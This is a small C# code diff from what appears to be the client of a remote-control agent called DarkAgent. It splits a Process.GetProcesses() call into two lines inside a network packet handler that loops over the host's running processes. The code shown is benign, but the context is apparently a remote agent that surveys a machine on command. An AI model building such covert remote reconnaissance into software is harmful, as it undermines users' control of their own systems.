@@ -23,7 +23,8 @@ namespace DarkAgent_Client.src.Network.DataNetwork.Packets.Receive
 
         public override void Run()
         {
-            Process[] myProcesses = Process.GetProcesses();
+            Process[] myProcesses;
+            myProcesses = Process.GetProcesses();
 
             foreach (Process proc in myProcesses)
             {
